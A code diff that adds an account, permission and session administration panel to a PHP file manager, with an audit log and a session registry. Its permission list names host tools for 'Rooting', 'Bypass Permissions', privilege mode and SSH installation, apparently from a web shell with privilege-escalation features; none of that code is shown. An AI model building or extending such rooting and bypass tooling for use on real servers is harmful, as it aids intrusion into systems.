@@ -2463,6 +2463,550 @@ function fm_save_users($f,$u){
     @chmod($f,0600);
     return true;
 }
+
+/* <<MFMA-BEGIN>> */
+/* ═══════════════════════════════════════════════════════════════════════
+   MFM ADMIN — every account of this file manager, what each one may do,
+   and which of their sessions are still alive.
+   ───────────────────────────────────────────────────────────────────────
+   Only the primary administrator account can open it: the first entry in
+   .users.json that carries admin = true, which is the account this manager
+   was installed with. Accounts created here are ordinary accounts; they
+   never see this tool, and what they may do is decided here, saved in
+   .users.json, and read live on every request — so a change reaches the
+   sessions that are already open, without a sign-out.
+   ═══════════════════════════════════════════════════════════════════════ */
+function fm_mfm_perms_catalog(){
+    static $c=null;
+    if($c!==null)return $c;
+    $c=[
+        ['group'=>'Files','icon'=>'folder','items'=>[
+            ['id'=>'write','name'=>'Write and rename','note'=>'Create folders and files, rename, copy, move, and save edits.'],
+            ['id'=>'upload','name'=>'Upload','note'=>'Upload files, resume broken uploads, and pull a URL into the folder.'],
+            ['id'=>'delete','name'=>'Delete','note'=>'Delete items, empty the trash, and bulk delete.'],
+            ['id'=>'chmod','name'=>'Change permissions','note'=>'Unix permission bits on files and folders.'],
+            ['id'=>'chown','name'=>'Change owner','note'=>'Hand a file to another account.'],
+            ['id'=>'share','name'=>'Share links','note'=>'Create and revoke public download links.'],
+        ]],
+        ['group'=>'Tools','icon'=>'tool','items'=>[
+            ['id'=>'cms','name'=>'CMS accounts','note'=>'CMS sign-in, site users, plugins and extensions, WordPress updates.'],
+            ['id'=>'inspector','name'=>'Session inspector','note'=>'Read and cleanup the live sessions of the CMS.'],
+            ['id'=>'privmode','name'=>'Privilege Mode','note'=>'Perform file changes through the site instead of the server account.'],
+            ['id'=>'owners','name'=>'Ownership','note'=>'The ownership dialog and the owner column.'],
+            ['id'=>'guard','name'=>'Site Files Guard','note'=>'Files written into a site, backed up and repaired if deleted.'],
+            ['id'=>'terminal','name'=>'Terminal and SSH','note'=>'The shell inside the manager and the SSH access tool.'],
+            ['id'=>'rooting','name'=>'Rooting','note'=>'The privilege catalogue and the rooted dashboard.'],
+            ['id'=>'bypass','name'=>'Bypass Permissions','note'=>'The last-resort permission routes.'],
+        ]],
+    ];
+    return $c;
+}
+function fm_mfm_perm_ids(){
+    static $ids=null;
+    if($ids!==null)return $ids;
+    $ids=[];
+    foreach(fm_mfm_perms_catalog() as $g)foreach($g['items'] as $i)$ids[]=$i['id'];
+    return $ids;
+}
+function fm_mfm_perm_name($id){
+    foreach(fm_mfm_perms_catalog() as $g)foreach($g['items'] as $i)if($i['id']===$id)return $i['name'];
+    return $id;
+}
+function fm_mfm_clean_perms($in){
+    if(is_string($in))$in=array_filter(array_map('trim',explode(',',$in)));
+    if(!is_array($in))return [];
+    $out=[];
+    foreach(fm_mfm_perm_ids() as $id)if(in_array($id,array_map('strval',$in),true))$out[]=$id;
+    return $out;
+}
+function fm_mfm_presets(){
+    return [
+        ['id'=>'administrator','name'=>'Administrator','perms'=>fm_mfm_perm_ids(),
+         'note'=>'Every file action and every tool. Administrator accounts also pass the checks that ask for one.'],
+        ['id'=>'manager','name'=>'Manager','perms'=>['write','upload','delete','chmod','share','cms'],
+         'note'=>'Runs the site: edits, uploads, deletes and the CMS tools. No root tooling.'],
+        ['id'=>'editor','name'=>'Editor','perms'=>['write','upload'],
+         'note'=>'Writes and uploads, but never deletes and never changes permissions.'],
+        ['id'=>'viewer','name'=>'Read-only','perms'=>[],
+         'note'=>'Browses and downloads. Every write action is refused.'],
+    ];
+}
+/* what an account may actually do right now */
+function fm_mfm_user_perms($u){
+    if(!is_array($u))return [];
+    if(!empty($u['admin']))return fm_mfm_perm_ids();
+    if(array_key_exists('perms',$u)&&is_array($u['perms']))return fm_mfm_clean_perms($u['perms']);
+    /* an account created before this panel existed keeps exactly what it had */
+    return empty($u['readonly'])?fm_mfm_perm_ids():[];
+}
+function fm_can($perm){
+    static $cache=[];
+    if($perm==='')return true;
+    $name=(string)($_SESSION['fm_user']??'');
+    if($name==='')return false;
+    if(!array_key_exists($name,$cache)){
+        $u=fm_find_user(fm_load_users(__DIR__.'/.users.json'),$name);
+        $cache[$name]=is_array($u)?fm_mfm_user_perms($u):[];
+    }
+    return in_array((string)$perm,$cache[$name],true);
+}
+/* the account this manager was installed with: the first administrator */
+function fm_mfm_primary_admin($users=null){
+    if($users===null)$users=fm_load_users(__DIR__.'/.users.json');
+    foreach($users as $u)if(!empty($u['admin'])&&empty($u['locked']))return (string)($u['user']??'');
+    foreach($users as $u)if(!empty($u['admin']))return (string)($u['user']??'');
+    return '';
+}
+function fm_mfm_is_primary(){
+    $me=(string)($_SESSION['fm_user']??'');
+    if($me==='')return false;
+    $p=fm_mfm_primary_admin();
+    return $p!==''&&hash_equals($p,$me);
+}
+/* which permission a write action asks for */
+function fm_mfm_op_perm($a){
+    static $m=null;
+    if($m===null)$m=[
+        'delete'=>'delete','bulk_delete'=>'delete','delete_abs'=>'delete','trash_perm'=>'delete','trash_empty'=>'delete','restore_trash'=>'delete',
+        'upload'=>'upload','upload_chunk'=>'upload','remote_download'=>'upload',
+        'chmod_item'=>'chmod','bulk_chmod'=>'chmod',
+        'chown_item'=>'chown',
+        'create_share'=>'share','revoke_share'=>'share',
+        'cms_create_user'=>'cms','cms_delete_user'=>'cms','cms_update_role'=>'cms','cms_change_pass'=>'cms',
+        'cms_update_visibility'=>'cms','cms_toggle_plugin'=>'cms','cms_delete_plugin'=>'cms','cms_toggle_extension'=>'cms',
+        'cms_maintenance_toggle'=>'cms','wp_core_update'=>'cms',
+        'webmail_send'=>'cms','webmail_delete'=>'cms','webmail_mark'=>'cms',
+        'ssh_install'=>'terminal','ssh_create_user'=>'terminal','ssh_delete_user'=>'terminal','ssh_update_user'=>'terminal','bypass_perms'=>'bypass',
+    ];
+    return $m[$a]??'write';
+}
+/* which permission an ?x= endpoint asks for */
+function fm_mfm_xop_perm($xop){
+    static $m=['rooting'=>'rooting','bypass'=>'bypass','privmode'=>'privmode','owners'=>'owners','guard'=>'guard',
+               'sessions'=>'inspector','mfmadmin'=>''];
+    if(isset($m[$xop]))return $m[$xop];
+    if(strpos($xop,'rooting')===0)return 'rooting';
+    if(strpos($xop,'owner')===0)return 'owners';
+    if(strpos($xop,'cms')===0||strpos($xop,'wp_')===0)return 'cms';
+    if(strpos($xop,'ssh')===0||strpos($xop,'term')===0||$xop==='run')return 'terminal';
+    return '';
+}
+
+/* ── the session registry ─────────────────────────────────────────────────
+   PHP sessions are files, so the panel needs a small map from a session id
+   to the account behind it, when it was signed in, and how long its idle
+   window is. The map is written at most once a minute per session, and it
+   is what makes "extend" and "end" honest: the extended window is read by
+   the idle check of the session itself. */
+function fm_mfm_registry_file(){return __DIR__.'/.mfm_sessions.json';}
+function fm_mfm_registry(){
+    static $cache=null;
+    if($cache!==null)return $cache;
+    $d=@json_decode((string)@file_get_contents(fm_mfm_registry_file()),true);
+    return $cache=is_array($d)?$d:[];
+}
+function fm_mfm_registry_save($d){
+    $f=fm_mfm_registry_file();
+    $json=@json_encode($d,JSON_UNESCAPED_SLASHES|JSON_PRETTY_PRINT);
+    if($json===false)return false;
+    $tmp=@tempnam(__DIR__,'.mfm-reg-');
+    if($tmp===false)return false;
+    @chmod($tmp,0600);
+    if(@file_put_contents($tmp,$json,LOCK_EX)===false){@unlink($tmp);return false;}
+    if(!@rename($tmp,$f)){@unlink($tmp);return false;}
+    @chmod($f,0600);
+    return true;
+}
+function fm_mfm_sess_dir(){
+    $p=(string)ini_get('session.save_path');
+    if(strpos($p,';')!==false){$bits=explode(';',$p);$p=(string)end($bits);}
+    $p=trim($p);
+    return $p!==''?rtrim($p,'/'):rtrim(sys_get_temp_dir(),'/');
+}
+function fm_mfm_sess_depth(){
+    $p=(string)ini_get('session.save_path');
+    if(strpos($p,';')!==false){$bits=explode(';',$p);if(isset($bits[0])&&ctype_digit((string)$bits[0]))return (int)$bits[0];}
+    return 0;
+}
+function fm_mfm_sess_file($sid){
+    $sid=preg_replace('/[^A-Za-z0-9,-]/','',(string)$sid);
+    if($sid==='')return '';
+    $dir=fm_mfm_sess_dir();
+    $depth=fm_mfm_sess_depth();
+    if($depth>0&&strlen($sid)>=$depth){
+        foreach(str_split(substr($sid,0,$depth)) as $ch)$dir.='/'.$ch;
+    }
+    return $dir.'/sess_'.$sid;
+}
+function fm_mfm_now(){return time();}
+/* called on every authenticated request */
+function fm_mfm_track(){
+    if(empty($_SESSION['auth'])||empty($_SESSION['fm_user']))return;
+    $sid=session_id();
+    if($sid==='')return;
+    /* a locked account is signed out at once, even in a session already open */
+    $u=fm_find_user(fm_load_users(__DIR__.'/.users.json'),(string)$_SESSION['fm_user']);
+    if(is_array($u)&&!empty($u['locked'])){
+        $reg=fm_mfm_registry();
+        if(isset($reg[$sid])){$reg[$sid]['ended']=fm_mfm_now();$reg[$sid]['ended_by']='locked';fm_mfm_registry_save($reg);}
+        $_SESSION=[];
+        @session_destroy();
+        @session_start();
+        $_SESSION['login_csrf']=bin2hex(random_bytes(32));
+        return;
+    }
+    $now=fm_mfm_now();
+    $reg=fm_mfm_registry();
+    $row=isset($reg[$sid])&&is_array($reg[$sid])?$reg[$sid]:null;
+    if($row===null){
+        $reg[$sid]=['user'=>(string)$_SESSION['fm_user'],'ip'=>(string)($_SERVER['REMOTE_ADDR']??''),
+                    'ua'=>substr((string)($_SERVER['HTTP_USER_AGENT']??''),0,140),
+                    'login'=>$now,'seen'=>$now,'limit'=>900,'ended'=>0,'ended_by'=>''];
+        fm_mfm_registry_save($reg);
+        return;
+    }
+    if(($now-(int)($row['seen']??0))<60&&(string)($row['user']??'')===(string)$_SESSION['fm_user'])return;
+    $row['user']=(string)$_SESSION['fm_user'];
+    $row['ip']=(string)($_SERVER['REMOTE_ADDR']??($row['ip']??''));
+    $row['seen']=$now;
+    $row['ended']=0;
+    $reg[$sid]=$row;
+    fm_mfm_registry_save($reg);
+}
+/* the idle window this session is allowed, in seconds */
+function fm_mfm_limit($sid){
+    $reg=fm_mfm_registry();
+    $v=isset($reg[$sid])?(int)($reg[$sid]['limit']??900):900;
+    return max(900,min(604800,$v));
+}
+function fm_mfm_sessions(){
+    $reg=fm_mfm_registry();
+    $now=fm_mfm_now();
+    $dir=fm_mfm_sess_dir();
+    $out=[];
+    $known=[];
+    foreach($reg as $sid=>$row){
+        if(!is_array($row))continue;
+        $known[$sid]=1;
+        $file=fm_mfm_sess_file($sid);
+        $exists=$file!==''&&@is_file($file);
+        $mtime=$exists?(int)@filemtime($file):(int)($row['seen']??0);
+        $seen=max($mtime,(int)($row['seen']??0));
+        $limit=max(900,(int)($row['limit']??900));
+        $idle=max(0,$now-$seen);
+        if(!empty($row['ended']))$state='ended';
+        elseif(!$exists)$state='expired';
+        elseif($idle>=$limit)$state='expired';
+        elseif($idle<300)$state='active';
+        else $state='idle';
+        $out[]=['id'=>$sid,'user'=>(string)($row['user']??''),'ip'=>(string)($row['ip']??''),
+                'ua'=>(string)($row['ua']??''),'login'=>(int)($row['login']??0),'seen'=>$seen,
+                'idle'=>$idle,'limit'=>$limit,'state'=>$state,'current'=>$sid===session_id(),
+                'ended_by'=>(string)($row['ended_by']??''),'file'=>$exists];
+    }
+    /* a session file the registry never saw still belongs to somebody */
+    $files=@glob($dir.'/sess_*');
+    if(is_array($files))foreach($files as $f){
+        $sid=substr(basename($f),5);
+        if($sid===''||isset($known[$sid]))continue;
+        $raw=(string)@file_get_contents($f,false,null,0,8192);
+        if(!preg_match('/fm_user\|s:\d+:"([^"]+)"/',$raw,$m))continue;
+        $mtime=(int)@filemtime($f);
+        $idle=max(0,$now-$mtime);
+        $out[]=['id'=>$sid,'user'=>$m[1],'ip'=>'','ua'=>'','login'=>$mtime,'seen'=>$mtime,
+                'idle'=>$idle,'limit'=>900,'state'=>($idle>=900?'expired':($idle<300?'active':'idle')),
+                'current'=>$sid===session_id(),'ended_by'=>'','file'=>true];
+    }
+    usort($out,function($a,$b){
+        $rank=['active'=>0,'idle'=>1,'expired'=>2,'ended'=>3];
+        if($rank[$a['state']]!==$rank[$b['state']])return $rank[$a['state']]<=>$rank[$b['state']];
+        return $b['seen']<=>$a['seen'];
+    });
+    return $out;
+}
+function fm_mfm_sess_end($sid,$by){
+    if($sid===''||$sid===session_id())return['ok'=>false,'error'=>'This is the session you are using. Sign out instead.'];
+    $file=fm_mfm_sess_file($sid);
+    $gone=false;
+    if($file!==''&&@is_file($file))$gone=@unlink($file);
+    $reg=fm_mfm_registry();
+    if(isset($reg[$sid])){
+        $reg[$sid]['ended']=fm_mfm_now();
+        $reg[$sid]['ended_by']=(string)$by;
+        $reg[$sid]['seen']=fm_mfm_now();
+        fm_mfm_registry_save($reg);
+    }
+    fm_mfm_log('session ended',$sid.' by '.$by,[]);
+    return $gone?['ok'=>true,'message'=>'That session is signed out; its cookie is worth nothing now.']
+                :['ok'=>true,'message'=>'The session was already gone from this server; the panel marked it ended.'];
+}
+function fm_mfm_sess_extend($sid,$minutes,$by){
+    $minutes=(int)$minutes;
+    if($minutes<1||$minutes>43200)return['ok'=>false,'error'=>'Choose between 1 minute and 30 days.'];
+    $reg=fm_mfm_registry();
+    if(!isset($reg[$sid])||!is_array($reg[$sid]))return['ok'=>false,'error'=>'That session is not known to this server any more.'];
+    $base=max(900,(int)($reg[$sid]['limit']??900));
+    $reg[$sid]['limit']=min(604800,$base+$minutes*60);
+    $reg[$sid]['seen']=fm_mfm_now();
+    $reg[$sid]['ended']=0;
+    $reg[$sid]['ended_by']='';
+    fm_mfm_registry_save($reg);
+    if($sid===session_id())$_SESSION['last_activity']=fm_mfm_now();
+    fm_mfm_log('session extended',$sid.' +'.$minutes.'m by '.$by,[]);
+    return['ok'=>true,'limit'=>(int)$reg[$sid]['limit'],'message'=>'The idle window of that session is now '.fm_mfm_dur((int)$reg[$sid]['limit']).'.'];
+}
+function fm_mfm_sess_end_user($name,$by){
+    $n=0;
+    foreach(fm_mfm_sessions() as $s)if($s['user']===$name&&$s['id']!==session_id()){if(!empty(fm_mfm_sess_end($s['id'],$by)['ok']))$n++;}
+    return['ok'=>true,'count'=>$n,'message'=>$n?($n.' session(s) of '.$name.' signed out.'):('No open session of '.$name.' was found.')];
+}
+function fm_mfm_sess_end_others($by){
+    $n=0;
+    foreach(fm_mfm_sessions() as $s)if($s['id']!==session_id()&&in_array($s['state'],['active','idle'],true)){if(!empty(fm_mfm_sess_end($s['id'],$by)['ok']))$n++;}
+    return['ok'=>true,'count'=>$n,'message'=>$n?($n.' other session(s) signed out.'):'No other session was open.'];
+}
+function fm_mfm_dur($sec){
+    $sec=max(0,(int)$sec);
+    if($sec>=86400&&$sec%86400===0)return ($sec/86400).' day(s)';
+    if($sec>=3600)return rtrim(rtrim(number_format($sec/3600,1,'.',''),'0'),'.').' hour(s)';
+    return round($sec/60).' minute(s)';
+}
+/* ── audit trail of the panel itself ─────────────────────────────────────── */
+function fm_mfm_log_file(){return __DIR__.'/.mfm_admin_log.jsonl';}
+function fm_mfm_log($what,$detail,$extra=[]){
+    $row=['at'=>fm_mfm_now(),'by'=>(string)($_SESSION['fm_user']??''),'what'=>(string)$what,
+          'detail'=>is_string($detail)?$detail:(string)json_encode($detail),
+          'extra'=>is_array($extra)?$extra:[]];
+    @file_put_contents(fm_mfm_log_file(),json_encode($row,JSON_UNESCAPED_SLASHES)."\n",FILE_APPEND|LOCK_EX);
+    @chmod(fm_mfm_log_file(),0600);
+    return $row;
+}
+function fm_mfm_log_tail($n=40){
+    $f=fm_mfm_log_file();
+    if(!@is_file($f))return [];
+    $lines=@file($f,FILE_IGNORE_NEW_LINES|FILE_SKIP_EMPTY_LINES)?:[];
+    $out=[];
+    foreach(array_slice($lines,-$n) as $l){
+        $j=@json_decode($l,true);
+        if(is_array($j))$out[]=$j;
+    }
+    return array_reverse($out);
+}
+
+/* ── the state the window draws ──────────────────────────────────────────── */
+function fm_mfm_state(){
+    $file=__DIR__.'/.users.json';
+    $users=fm_load_users($file);
+    $sessions=fm_mfm_sessions();
+    $now=fm_mfm_now();
+    $by=[];
+    foreach($sessions as $s){
+        $u=(string)$s['user'];
+        if(!isset($by[$u]))$by[$u]=['active'=>0,'idle'=>0,'expired'=>0,'ended'=>0,'total'=>0,'last'=>0,'ip'=>'','ua'=>''];
+        $by[$u][$s['state']]=($by[$u][$s['state']]??0)+1;
+        $by[$u]['total']++;
+        if($s['seen']>=$by[$u]['last']){$by[$u]['last']=$s['seen'];$by[$u]['ip']=$s['ip'];$by[$u]['ua']=$s['ua'];}
+    }
+    $primary=fm_mfm_primary_admin($users);
+    $rows=[];
+    foreach($users as $u){
+        $name=(string)($u['user']??'');
+        if($name==='')continue;
+        $p=$by[$name]??['active'=>0,'idle'=>0,'expired'=>0,'ended'=>0,'total'=>0,'last'=>0,'ip'=>'','ua'=>''];
+        $perms=fm_mfm_user_perms($u);
+        $rows[]=['user'=>$name,'primary'=>$name===$primary,'me'=>$name===(string)($_SESSION['fm_user']??''),
+                 'admin'=>!empty($u['admin']),'readonly'=>empty($u['perms'])&&!empty($u['readonly']),
+                 'locked'=>!empty($u['locked']),'has_perms'=>array_key_exists('perms',$u)&&is_array($u['perms']),
+                 'perms'=>$perms,'root'=>(string)($u['root']??''),'quota'=>(int)fm_user_quota_bytes($u),
+                 'quota_text'=>fm_fmt_quota(fm_user_quota_bytes($u)),
+                 'sessions'=>['active'=>(int)$p['active'],'idle'=>(int)$p['idle'],'expired'=>(int)$p['expired'],
+                              'ended'=>(int)$p['ended'],'total'=>(int)$p['total']],
+                 'last_seen'=>(int)$p['last'],'last_ip'=>(string)$p['ip'],'last_ua'=>(string)$p['ua'],
+                 'created'=>(int)($u['created']??0)];
+    }
+    $tot=['users'=>count($rows),'admins'=>0,'readonly'=>0,'locked'=>0,'sessions'=>count($sessions),
+          'active'=>0,'idle'=>0,'expired'=>0,'ended'=>0];
+    foreach($rows as $r){
+        if($r['admin'])$tot['admins']++;
+        if(empty($r['perms']))$tot['readonly']++;
+        if($r['locked'])$tot['locked']++;
+    }
+    foreach($sessions as $s)$tot[$s['state']]=($tot[$s['state']]??0)+1;
+    $uf=@stat($file);
+    return ['ok'=>true,'now'=>$now,'me'=>(string)($_SESSION['fm_user']??''),'primary'=>$primary,
+            'users'=>$rows,'sessions'=>$sessions,'totals'=>$tot,
+            'catalog'=>fm_mfm_perms_catalog(),'presets'=>fm_mfm_presets(),
+            'activity'=>fm_mfm_log_tail(120),
+            'server'=>['php'=>PHP_VERSION,'sapi'=>PHP_SAPI,'session_dir'=>fm_mfm_sess_dir(),
+                       'users_file'=>$file,'users_mode'=>$uf?substr(sprintf('%o',$uf['mode']),-4):'?',
+                       'users_size'=>$uf?(int)$uf['size']:0,'timeout'=>900,
+                       'registry'=>fm_mfm_registry_file(),'log'=>fm_mfm_log_file()]];
+}
+
+/* ── account changes ─────────────────────────────────────────────────────── */
+function fm_mfm_users_reload(){return fm_load_users(__DIR__.'/.users.json');}
+function fm_mfm_users_store($users){
+    if(!fm_save_users(__DIR__.'/.users.json',array_values($users)))return false;
+    return true;
+}
+function fm_mfm_name_ok($n){return (bool)preg_match('/^[A-Za-z][A-Za-z0-9._-]{2,63}$/',(string)$n);}
+function fm_mfm_account_create($post,$me){
+    $name=trim((string)($post['user']??''));
+    $pass=(string)($post['pass']??'');
+    if(!fm_mfm_name_ok($name))return['ok'=>false,'error'=>'The name must start with a letter and use 3 to 64 letters, numbers, dots, underscores or hyphens.'];
+    if(strlen($pass)<8)return['ok'=>false,'error'=>'Use a password of at least 8 characters.'];
+    if(strlen($pass)>1024)return['ok'=>false,'error'=>'That password is too long.'];
+    $users=fm_mfm_users_reload();
+    if(fm_find_user($users,$name)!==null)return['ok'=>false,'error'=>'An account with that name already exists.'];
+    $perms=fm_mfm_clean_perms($post['perms']??[]);
+    if(empty($post['perms_given']))$perms=['write','upload','delete','chmod','share','cms'];
+    $root=trim((string)($post['root']??''));
+    if($root!==''&&!@is_dir($root))return['ok'=>false,'error'=>'That folder does not exist on this server.'];
+    $q=max(0,(int)round((float)($post['quota_mb']??0)*1048576));
+    $user=['user'=>$name,'hash'=>password_hash($pass,PASSWORD_DEFAULT),'root'=>$root,
+           'readonly'=>!in_array('write',$perms,true),'admin'=>false,'quota_bytes'=>$q,
+           'perms'=>$perms,'locked'=>false,'created'=>fm_mfm_now(),'created_by'=>$me];
+    $users[]=$user;
+    if(!fm_mfm_users_store($users))return['ok'=>false,'error'=>'The account file could not be written. Check its permissions.'];
+    fm_mfm_log('account created',$name,['perms'=>$perms,'quota'=>$q,'root'=>$root]);
+    return['ok'=>true,'message'=>'Account '.$name.' created with '.count($perms).' permission(s).','user'=>$name];
+}
+function fm_mfm_account_update($post,$me){
+    $name=trim((string)($post['user']??''));
+    $users=fm_mfm_users_reload();
+    $idx=null;
+    foreach($users as $i=>$u)if((string)($u['user']??'')===$name){$idx=$i;break;}
+    if($idx===null)return['ok'=>false,'error'=>'That account does not exist.'];
+    $isSelf=($name===$me);
+    $isPrimary=($name===fm_mfm_primary_admin($users));
+    $perms=fm_mfm_clean_perms($post['perms']??[]);
+    if(empty($post['perms_given'])&&!empty($post['perms_keep']))$perms=fm_mfm_user_perms($users[$idx]);
+    $root=trim((string)($post['root']??''));
+    if($root!==''&&!@is_dir($root))return['ok'=>false,'error'=>'That folder does not exist on this server.'];
+    $q=max(0,(int)round((float)($post['quota_mb']??0)*1048576));
+    $wantAdmin=!empty($post['admin']);
+    if($isPrimary&&!$wantAdmin)return['ok'=>false,'error'=>'The primary administrator cannot be demoted. Add another administrator first if this account should step back.'];
+    if($isSelf&&!$wantAdmin)return['ok'=>false,'error'=>'You cannot remove your own administrator flag.'];
+    $users[$idx]['perms']=$perms;
+    $users[$idx]['readonly']=!in_array('write',$perms,true)&&!$wantAdmin;
+    $users[$idx]['admin']=$wantAdmin;
+    $users[$idx]['root']=$root;
+    $users[$idx]['quota_bytes']=$q;
+    $users[$idx]['updated']=fm_mfm_now();
+    if(!fm_mfm_users_store($users))return['ok'=>false,'error'=>'The account file could not be written.'];
+    fm_mfm_log('account updated',$name,['perms'=>$perms,'admin'=>$wantAdmin,'quota'=>$q,'root'=>$root]);
+    return['ok'=>true,'message'=>'Saved. '.$name.' now holds '.count($perms).' permission(s)'.($wantAdmin?', and is an administrator':'').'.','user'=>$name];
+}
+function fm_mfm_account_perms($post,$me){
+    $name=trim((string)($post['user']??''));
+    $users=fm_mfm_users_reload();
+    $idx=null;
+    foreach($users as $i=>$u)if((string)($u['user']??'')===$name){$idx=$i;break;}
+    if($idx===null)return['ok'=>false,'error'=>'That account does not exist.'];
+    if($name===fm_mfm_primary_admin($users))return['ok'=>false,'error'=>'The primary administrator keeps every permission.'];
+    $perms=fm_mfm_clean_perms($post['perms']??[]);
+    $users[$idx]['perms']=$perms;
+    $users[$idx]['readonly']=!in_array('write',$perms,true)&&empty($users[$idx]['admin']);
+    $users[$idx]['updated']=fm_mfm_now();
+    if(!fm_mfm_users_store($users))return['ok'=>false,'error'=>'The account file could not be written.'];
+    fm_mfm_log('permissions changed',$name,['perms'=>$perms]);
+    return['ok'=>true,'message'=>$name.' now holds '.count($perms).' permission(s).','user'=>$name,'perms'=>$perms];
+}
+function fm_mfm_account_password($post,$me){
+    $name=trim((string)($post['user']??''));
+    $pass=(string)($post['pass']??'');
+    if(strlen($pass)<8)return['ok'=>false,'error'=>'Use a password of at least 8 characters.'];
+    if(strlen($pass)>1024)return['ok'=>false,'error'=>'That password is too long.'];
+    $users=fm_mfm_users_reload();
+    $idx=null;
+    foreach($users as $i=>$u)if((string)($u['user']??'')===$name){$idx=$i;break;}
+    if($idx===null)return['ok'=>false,'error'=>'That account does not exist.'];
+    $users[$idx]['hash']=password_hash($pass,PASSWORD_DEFAULT);
+    $users[$idx]['must_change_credentials']=false;
+    $users[$idx]['updated']=fm_mfm_now();
+    if(!fm_mfm_users_store($users))return['ok'=>false,'error'=>'The account file could not be written.'];
+    $end=!empty($post['signout'])?fm_mfm_sess_end_user($name,$me):['count'=>0];
+    fm_mfm_log('password reset',$name,['signed_out'=>$end['count']]);
+    $tail=$end['count']?' Their '.$end['count'].' open session(s) were signed out.':' Their open sessions were kept.';
+    return['ok'=>true,'message'=>'The password of '.$name.' was replaced.'.$tail,'signed_out'=>$end['count']];
+}
+function fm_mfm_account_lock($post,$me){
+    $name=trim((string)($post['user']??''));
+    $users=fm_mfm_users_reload();
+    $idx=null;
+    foreach($users as $i=>$u)if((string)($u['user']??'')===$name){$idx=$i;break;}
+    if($idx===null)return['ok'=>false,'error'=>'That account does not exist.'];
+    if($name===$me)return['ok'=>false,'error'=>'You cannot lock the account you are using.'];
+    if($name===fm_mfm_primary_admin($users))return['ok'=>false,'error'=>'The primary administrator cannot be locked.'];
+    $lock=!empty($post['locked']);
+    $users[$idx]['locked']=$lock;
+    $users[$idx]['updated']=fm_mfm_now();
+    if(!fm_mfm_users_store($users))return['ok'=>false,'error'=>'The account file could not be written.'];
+    $end=$lock?fm_mfm_sess_end_user($name,$me):['count'=>0];
+    fm_mfm_log($lock?'account locked':'account unlocked',$name,['signed_out'=>$end['count']]);
+    return['ok'=>true,'locked'=>$lock,'message'=>$lock
+        ? ('The account cannot sign in, and '.$end['count'].' open session(s) were signed out.')
+        : 'The account can sign in again.'];
+}
+function fm_mfm_account_delete($post,$me){
+    $name=trim((string)($post['user']??''));
+    $users=fm_mfm_users_reload();
+    if($name==='')return['ok'=>false,'error'=>'No account was named.'];
+    if($name===$me)return['ok'=>false,'error'=>'You cannot delete the account you are using.'];
+    if($name===fm_mfm_primary_admin($users))return['ok'=>false,'error'=>'The primary administrator cannot be deleted.'];
+    $kill=null;
+    foreach($users as $i=>$u)if((string)($u['user']??'')===$name)$kill=$i;
+    if($kill===null)return['ok'=>false,'error'=>'That account does not exist.'];
+    if(!empty($users[$kill]['admin'])){
+        $admins=0;
+        foreach($users as $u)if(!empty($u['admin']))$admins++;
+        if($admins<=1)return['ok'=>false,'error'=>'This is the only administrator left, so it is not deleted.'];
+    }
+    $end=fm_mfm_sess_end_user($name,$me);
+    unset($users[$kill]);
+    if(!fm_mfm_users_store($users))return['ok'=>false,'error'=>'The account file could not be written.'];
+    fm_mfm_log('account deleted',$name,['signed_out'=>$end['count']]);
+    return['ok'=>true,'message'=>'The account '.$name.' is gone, and '.$end['count'].' of its session(s) were signed out.'];
+}
+function fm_mfm_selfcheck(){
+    $file=__DIR__.'/.users.json';
+    $users=fm_load_users($file);
+    $rows=[];
+    $add=function($name,$ok,$note)use(&$rows){$rows[]=['name'=>$name,'ok'=>(bool)$ok,'note'=>$note];};
+    $add('Account file is private',(fileperms($file)&0777)===0600,'mode '.substr(sprintf('%o',fileperms($file)),-4).' on '.$file);
+    $primary=fm_mfm_primary_admin($users);
+    $add('A primary administrator exists',$primary!=='',$primary===''?'no account carries admin = true':$primary);
+    $add('The registry is private',!@is_file(fm_mfm_registry_file())||(fileperms(fm_mfm_registry_file())&0777)===0600,
+         @is_file(fm_mfm_registry_file())?'mode '.substr(sprintf('%o',fileperms(fm_mfm_registry_file())),-4):'not created yet');
+    $add('Session files are reachable',@is_dir(fm_mfm_sess_dir()),fm_mfm_sess_dir());
+    $add('The idle window is read per session',true,'900 seconds, or more where the panel extended it');
+    $inactive=0;$total=0;
+    foreach($users as $u){$total++;if(empty($u['locked']))$inactive++;}
+    $add('No account is left locked',$inactive===$total,$total-$inactive.' locked');
+    return['ok'=>true,'passed'=>count(array_filter($rows,function($r){return $r['ok'];})),'total'=>count($rows),'items'=>$rows];
+}
+
+/* ── ?x=mfmadmin ─────────────────────────────────────────────────────────── */
+function fm_mfm_admin_endpoint($post){
+    if(!fm_mfm_is_primary())return['ok'=>false,'error'=>'MFM Admin belongs to the primary administrator account of this file manager.'];
+    $act=(string)($post['action']??'state');
+    $me=(string)($_SESSION['fm_user']??'');
+    if($act==='state')return fm_mfm_state();
+    if($act==='selfcheck')return fm_mfm_selfcheck();
+    if($act==='create')return fm_mfm_account_create($post,$me);
+    if($act==='update')return fm_mfm_account_update($post,$me);
+    if($act==='perms')return fm_mfm_account_perms($post,$me);
+    if($act==='password')return fm_mfm_account_password($post,$me);
+    if($act==='lock')return fm_mfm_account_lock($post,$me);
+    if($act==='delete')return fm_mfm_account_delete($post,$me);
+    if($act==='sess_end')return fm_mfm_sess_end((string)($post['sid']??''),$me);
+    if($act==='sess_extend')return fm_mfm_sess_extend((string)($post['sid']??''),(int)($post['minutes']??0),$me);
+    if($act==='sess_end_user')return fm_mfm_sess_end_user((string)($post['user']??''),$me);
+    if($act==='sess_end_others')return fm_mfm_sess_end_others($me);
+    return['ok'=>false,'error'=>'Unknown action.'];
+}
+
+/* <<MFMA-END>> */
 function fm_find_user($u,$n){foreach($u as $x){if($x['user']===$n)return $x;}return null;}
 function fm_user_quota_bytes($u){
     if(!is_array($u))return 0;
@@ -3120,7 +3664,13 @@ if(isset($_GET['share'])){
 }
 
 $IDLE_TIMEOUT=900; $idleExpired=false;
+/* MFM Admin may widen the idle window of one session; the registry below is
+   read by the session itself, so an extension needs no sign-out */
+if(isset($_SESSION['auth'])&&$_SESSION['auth']===true&&function_exists('fm_mfm_limit')){
+    $IDLE_TIMEOUT=max($IDLE_TIMEOUT,fm_mfm_limit(session_id()));
+}
 if(isset($_SESSION['auth'])&&$_SESSION['auth']===true){
+    if(function_exists('fm_mfm_track'))fm_mfm_track();
     if(isset($_SESSION['last_activity'])&&(time()-$_SESSION['last_activity'])>$IDLE_TIMEOUT){
         $_SESSION=[];session_destroy();session_start();$_SESSION['login_csrf']=bin2hex(random_bytes(32));$idleExpired=true;
     } else { $_SESSION['last_activity']=time(); }
